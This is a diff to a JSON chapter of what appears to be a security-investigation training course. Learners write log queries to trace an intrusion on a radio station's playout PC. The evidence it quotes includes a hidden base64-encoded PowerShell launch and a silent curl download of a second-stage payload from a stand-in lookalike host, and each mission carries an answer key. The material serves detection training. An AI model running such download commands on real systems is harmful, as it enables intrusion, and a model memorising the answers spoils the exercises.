@@ -5,12 +5,48 @@
   "intro": "AUTOMATION-01 airs whatever it is told to air. Dez keeps it running with PowerShell, so PowerShell on that machine is normal. What is not normal is PowerShell that hides its own window and carries its instructions in base64. Every process start on the pier is a PROCESS_LAUNCH event with the full path and the command line.",
   "concepts": ["Anchor the end of a path to match the file, not the folder", "Dual-use tools need context", "Scheduled tasks are how one bad minute becomes a bad night", "Grouped fields search several paths at once"],
   "recap": [
+    "Count launches per account on one machine and read the shared account's footprint against the heartbeat",
     "Match a file name at the end of a Windows path, with the backslashes escaped",
-    "Spot a dual-use flag and say what context makes it suspicious",
-    "Find a scheduled task by its own event type and read its command line",
-    "Use a grouped field to search several path fields in one condition"
+    "Read parent and child as two roles of one launch and let the command line separate a restart from an intrusion",
+    "Spot a dual-use flag or a built-in downloader and say what context makes it suspicious",
+    "Find a scheduled task by its own event type and everything in its folder with a grouped field",
+    "Separate one launch of a trusted tool from dozens by its command-line flag"
   ],
   "missions": [
+    {
+      "id": "C03-M05",
+      "kind": "watch",
+      "title": "Three accounts, one machine",
+      "beat": "Before you read a single command line, learn who runs things on the playout PC on a normal night. Count process launches on AUTOMATION-01 per account. The service account should dominate. Anything else is a footprint worth measuring.",
+      "question": "Which accounts launched processes on AUTOMATION-01 tonight, and how many each?",
+      "concept": {"title":"A shared account leaves a footprint you can count","text":"svc-playout runs the playout software and advances the schedule every few minutes; that is the machine's heartbeat. A human at the console, Dez or anyone else, adds a handful of launches. Counting per account turns \"someone used the playout PC\" into a number per name, and the shared account's number is the size of the intrusion on that machine."},
+      "explain": [
+        {"part":"principal.hostname = \"AUTOMATION-01\"","meaning":"Only the playout PC."},
+        {"part":"match:\n  principal.user.userid","meaning":"One row per account that launched something there."},
+        {"part":"$launches = count(metadata.id)","meaning":"How many process starts each account produced."}
+      ],
+      "starter": "metadata.event_type = \"PROCESS_LAUNCH\"\nprincipal.hostname = \"AUTOMATION-01\"\nmatch:\n  principal.user.userid\noutcome:\n  $launches = count(metadata.id)\norder:\n  $launches desc",
+      "reference": "metadata.event_type = \"PROCESS_LAUNCH\"\nprincipal.hostname = \"AUTOMATION-01\"\nmatch:\n  principal.user.userid\noutcome:\n  $launches = count(metadata.id)\norder:\n  $launches desc",
+      "hints": [
+        "Run it. Three rows. The top one is the machine's own heartbeat.",
+        "Compare the shared account's row with Dez's. One of them is a restart; the other is a working session.",
+        "svc-playout 39 (playout_ctl.exe --advance, all night), pledge-desk 5 (19:33 to 03:02), dez.okafor 1 (the 20:15 restart)."
+      ],
+      "answer": {"prompt":"How many launches does the pledge-desk row show?","value":"5","check":{"type":"cell","row":{"principal.user.userid":"pledge-desk"},"column":"$launches"}},
+      "call": {
+        "prompt": "The service account has dozens of launches, the shared account a handful, the engineer one. Which row is the chapter about, and why?",
+        "options": [
+          {"id":"A","label":"The service account; the most launches means the most activity, and the most activity is where an intrusion hides"},
+          {"id":"B","label":"The engineer; a single launch by a human at midnight-adjacent hours on a production machine is the classic insider pattern"},
+          {"id":"C","label":"The shared account; it has no business launching anything on the playout PC, so every one of its launches is the intrusion"}
+        ],
+        "correct": "C",
+        "why": "Volume is the service doing its job. The shared account arrived from outside at 19:21 and has no reason to be at the playout console at all; its few launches are the whole story of this chapter."
+      },
+      "clue": "Thirty-nine heartbeats from svc-playout. One restart from Dez. Five launches from pledge-desk, between 19:33 and 03:02: an encoded command, a task, a download, a compression and an injection. Chapter 3 reads those five.",
+      "logIt": {"kind":"evidence","prompt":"Log the footprint as evidence. Time: 19:33 to 03:02. Observation: on AUTOMATION-01, svc-playout launched 39 processes (the playout heartbeat), dez.okafor one, pledge-desk five. Records: at least one pledge-desk launch (open the row's events in the next missions, or cite the encoded command evt-00131). Confidence high for the counts.","mustInclude":["pledge-desk","AUTOMATION-01","evt-00131|evt-00140|evt-00145|evt-00647|evt-00713"]},
+      "caveat": "Production machines run far more than forty processes a night. The shape of the comparison holds; the numbers here are small so you can read every row."
+    },
     {
       "id": "C03-M01",
       "kind": "watch",
@@ -79,6 +115,40 @@
       "caveat": "The trainer does not decode the base64. In a real investigation you would, in an isolated tool, never in a browser you trust with other sessions."
     },
     {
+      "id": "C03-M06",
+      "kind": "build",
+      "title": "Who launched the launcher",
+      "beat": "Every process has a parent. The encoded PowerShell did not start itself; cmd.exe started it. Dez's restart has the same parent. Filter on the parent and the child together, and see which launches share the shape.",
+      "question": "How many PowerShell launches on the pier were started by cmd.exe?",
+      "concept": {"title":"Parent and child are two roles of one event","text":"principal.process.file.full_path is the parent: the program that was already running. target.process.file.full_path is the child: the program it started. A command prompt starting PowerShell is how a human at a console does it, and how a script pretending to be a human does it. The parent tells you how the child got there; the command line tells you what it was for."},
+      "explain": [
+        {"part":"principal.process.file.full_path = /\\\\cmd\\.exe$/ nocase","meaning":"The parent is a command prompt. Same escaping as the child pattern: two backslashes for one, a backslash before the dot."},
+        {"part":"target.process.file.full_path = /\\\\powershell\\.exe$/ nocase","meaning":"The child is PowerShell."},
+        {"part":"two role conditions, one event","meaning":"Both describe the same PROCESS_LAUNCH record. This is not a join; it is one row with two sides."}
+      ],
+      "starter": "metadata.event_type = \"PROCESS_LAUNCH\"\n___.process.file.full_path = /\\\\cmd\\.exe$/ nocase\ntarget.process.file.full_path = /\\\\powershell\\.exe$/ nocase",
+      "reference": "metadata.event_type = \"PROCESS_LAUNCH\"\nprincipal.process.file.full_path = /\\\\cmd\\.exe$/ nocase\ntarget.process.file.full_path = /\\\\powershell\\.exe$/ nocase",
+      "hints": [
+        "The parent process is the one that acted, so it sits in the principal role.",
+        "Fill the gap with principal, so the first path condition reads principal.process.file.full_path.",
+        "metadata.event_type = \"PROCESS_LAUNCH\"\nprincipal.process.file.full_path = /\\\\cmd\\.exe$/ nocase\ntarget.process.file.full_path = /\\\\powershell\\.exe$/ nocase"
+      ],
+      "answer": {"prompt":"How many launches match?","value":"2","check":{"type":"count"}},
+      "call": {
+        "prompt": "Both rows are cmd.exe starting PowerShell on the same machine: the shared account at 19:33 and Dez at 20:15. The parent is identical. What separates them?",
+        "options": [
+          {"id":"A","label":"Nothing in the log; identical parent and child means identical behaviour, and only an interview with Dez can separate the two rows"},
+          {"id":"B","label":"The command line and the account: a hidden, encoded command from an account that had just arrived from outside, against a plain service restart from the engineer"},
+          {"id":"C","label":"The time: 19:33 is during the live drive when nobody should touch the playout PC, and 20:15 is a quiet slot when maintenance is expected"}
+        ],
+        "correct": "B",
+        "why": "Parent-child shape is context, not a verdict. The same shape carried a restart and an intrusion within an hour; the command line and who ran it decide which is which."
+      },
+      "clue": "Two launches from a command prompt: 19:33, pledge-desk, \"-nop -w hidden -enc\"; 20:15, dez.okafor, \"Restart-Service PlayoutEngine\". The 01:58 Compress-Archive has a different parent: PowerShell started PowerShell. A script, not a hand.",
+      "logIt": {"kind":"timeline","prompt":"Add a Timeline entry. Time: 19:33. Fact: cmd.exe on AUTOMATION-01 started a hidden, base64-encoded PowerShell as pledge-desk at 19:33:02, two minutes after the run-as; Dez's 20:15 restart has the same parent and a plain command line. Evidence ref: the # of your PowerShell evidence from the first mission of this chapter.","mustInclude":["19:33","cmd.exe|encoded|-enc"]},
+      "caveat": "Many EDR products also record a grandparent or the parent's command line. If yours does, the parent of cmd.exe here (a remote-desktop session host) would be the next question."
+    },
+    {
       "id": "C03-M03",
       "kind": "build",
       "title": "The task that keeps running",
@@ -112,6 +182,36 @@
       "caveat": "Not every endpoint product emits SCHEDULED_TASK_CREATION. If yours does not, the schtasks.exe process launch is the fallback: search PROCESS_LAUNCH for schtasks on AUTOMATION-01 and you will find it one second before the task event."
     },
     {
+      "id": "C03-M07",
+      "kind": "solo",
+      "title": "The download",
+      "beat": "A minute after the task was created, something fetched a file from the lookalike's content host. Windows ships a command-line downloader. Find every launch of curl.exe on the pier and read its command line.",
+      "question": "When did curl.exe run, and what did it fetch?",
+      "concept": {"title":"Living off the land","text":"curl.exe is part of Windows. So are PowerShell, schtasks.exe and certutil. An attacker who uses the tools already on the machine leaves no new binary to find; they leave command lines. The file-name pattern you learned for PowerShell works for any program: anchor the end of the path and let the command line tell you the rest."},
+      "explain": [],
+      "starter": "",
+      "reference": "metadata.event_type = \"PROCESS_LAUNCH\"\ntarget.process.file.full_path = /\\\\curl\\.exe$/ nocase",
+      "hints": [
+        "Same shape as the PowerShell query: the launch event type and an end-anchored path pattern on target.process.file.full_path, with curl in place of powershell.",
+        "target.process.file.full_path = /\\\\curl\\.exe$/ nocase, under the PROCESS_LAUNCH filter. Two backslashes, then the name, then the escaped dot.",
+        "metadata.event_type = \"PROCESS_LAUNCH\"\ntarget.process.file.full_path = /\\\\curl\\.exe$/ nocase"
+      ],
+      "answer": {"prompt":"At what time did curl.exe run (HH:MM, UTC)?","value":"19:36","also":["19:36:40"],"check":{"type":"time","index":0}},
+      "call": {
+        "prompt": "The command line reads: curl.exe -s https://cdn-sync.pier9-partners.example/stage -o C:\\ProgramData\\PledgeSync\\stage.bin. What is the strongest reading?",
+        "options": [
+          {"id":"A","label":"A second-stage payload was fetched from the lookalike's host into the task's folder, silently; the beacons in chapter 4 go to the same name"},
+          {"id":"B","label":"A routine content sync: cdn-sync in the hostname and a .bin extension are how playout vendors ship audio updates to a station"},
+          {"id":"C","label":"An attempted download that failed, because -s suppresses output and nothing in the log shows the file arriving on disk"}
+        ],
+        "correct": "A",
+        "why": "The host is under the lookalike domain, the destination is the folder the task runs from, and -s hides progress. Whether stage.bin landed is a question for the file log and a Gap if it is silent; the intent is not in doubt."
+      },
+      "clue": "One launch, 19:36:40, pledge-desk, parent PowerShell: a silent fetch from cdn-sync.pier9-partners.example into C:\\ProgramData\\PledgeSync\\stage.bin. The same name AUTOMATION-01 will ask DNS for every ten minutes from 19:40. Chapter 4 counts those.",
+      "logIt": {"kind":"evidence","prompt":"Log the download as evidence. Time: 19:36. Observation: curl.exe launched by pledge-desk on AUTOMATION-01 at 19:36:40, fetching https://cdn-sync.pier9-partners.example/stage to C:\\ProgramData\\PledgeSync\\stage.bin with output suppressed; parent powershell.exe. Records: the launch (open it, press Add to Casebook). Note that no FILE_CREATION for stage.bin is in the data; that is a Gap if you want to add one.","mustInclude":["19:36","cdn-sync.pier9-partners.example","evt-00145"]},
+      "caveat": "Real downloaders are many: certutil, bitsadmin, PowerShell's Invoke-WebRequest, msiexec with a URL. A detection on curl alone is a start, not a net."
+    },
+    {
       "id": "C03-M04",
       "kind": "solo",
       "title": "Everything in the PledgeSync folder",
@@ -140,6 +240,39 @@
       "clue": "Four events: the task, the script, a zip of the donor list, and a WAV file written at 02:58, twelve minutes before the pirate segment aired. The 03:02 playout_ctl.exe launch injected exactly that file into the 03:10 slot. You now know how the segment got on air. You still need where the data went.",
       "logIt": {"kind":"evidence","prompt":"Log the PledgeSync folder as evidence. Time: 19:35 to 02:58. Observation: task creation at 19:35:22, sync.ps1 written at 19:36:05, donors_export.zip at 02:05:12 and segment.wav at 02:58:00, all under C:\\ProgramData\\PledgeSync by pledge-desk. Records: the four events. Where to find it: the file_path grouped field; SCHEDULED_TASK_CREATION and FILE_CREATION.","mustInclude":["donors_export.zip","segment.wav","evt-00141|evt-00143|evt-00669|evt-00705"]},
       "caveat": "Grouped fields exist in Google's Search; the members modelled here are a subset of the real list."
+    },
+    {
+      "id": "C03-M08",
+      "kind": "build",
+      "title": "The injection",
+      "beat": "playout_ctl.exe is the playout software's own control tool. svc-playout runs it with --advance all night to move the schedule along. At 03:02 somebody ran it with a different flag. Find that launch.",
+      "question": "When was the segment injected into the schedule, and into which slot?",
+      "concept": {"title":"The same tool, a different flag","text":"A legitimate program with a dangerous option is the hardest shape to detect: the binary is signed, expected and busy. What changes is the command line. Filtering the path to the control tool and the command line to the unusual flag separates one launch from thirty-nine routine ones, and that one launch is how the 03:10 segment got on air."},
+      "explain": [
+        {"part":"target.process.file.full_path = /\\\\playout_ctl\\.exe$/ nocase","meaning":"The control tool, by file name."},
+        {"part":"target.process.command_line = /--inject/","meaning":"The flag that loads a file into a slot. --advance is routine; --inject is not."}
+      ],
+      "starter": "metadata.event_type = \"PROCESS_LAUNCH\"\ntarget.process.file.full_path = /\\\\playout_ctl\\.exe$/ nocase\ntarget.process.command_line = /___/",
+      "reference": "metadata.event_type = \"PROCESS_LAUNCH\"\ntarget.process.file.full_path = /\\\\playout_ctl\\.exe$/ nocase\ntarget.process.command_line = /--inject/",
+      "hints": [
+        "Run the query with only the path condition first and read the command lines: one flag appears once, another dozens of times.",
+        "Put --inject between the slashes.",
+        "metadata.event_type = \"PROCESS_LAUNCH\"\ntarget.process.file.full_path = /\\\\playout_ctl\\.exe$/ nocase\ntarget.process.command_line = /--inject/"
+      ],
+      "answer": {"prompt":"At what time was --inject run (HH:MM, UTC)?","value":"03:02","also":["03:02:15"],"check":{"type":"time","index":0}},
+      "call": {
+        "prompt": "The command line names slot 0310 and the WAV file written four minutes earlier in the PledgeSync folder. What can the brief now say about the broadcast?",
+        "options": [
+          {"id":"A","label":"That the playout software malfunctioned and played a stray file from a working folder, which the vendor should explain"},
+          {"id":"B","label":"That the shared account loaded segment.wav into the 03:10 slot with the station's own control tool, eight minutes before it aired"},
+          {"id":"C","label":"That Marco injected the segment, because only a former host would know the control tool's flags and the overnight slot numbering"}
+        ],
+        "correct": "B",
+        "why": "The launch is the mechanism: account, tool, flag, file, slot, time. Who knew the flags is a hypothesis about a person; the record is about an account on a machine."
+      },
+      "clue": "03:02:15, pledge-desk, parent cmd.exe: playout_ctl.exe --inject --slot 0310 --file C:\\ProgramData\\PledgeSync\\segment.wav. The file was written at 02:58. The slot aired at 03:10. Hal was in the control room by 03:14. The mechanism of the broadcast is now a single row.",
+      "logIt": {"kind":"timeline","prompt":"Add a Timeline entry. Time: 03:02. Fact: pledge-desk ran playout_ctl.exe --inject --slot 0310 --file C:\\ProgramData\\PledgeSync\\segment.wav on AUTOMATION-01 at 03:02:15; the segment aired at 03:10. Evidence ref: the # of your PledgeSync folder evidence, which carries the segment.wav record.","mustInclude":["03:02","segment.wav|0310|inject"]},
+      "caveat": "Flags are a convention of each product. In your own environment, learn which options of your critical tools change what is served, and alert on those by command line."
     }
   ]
 }
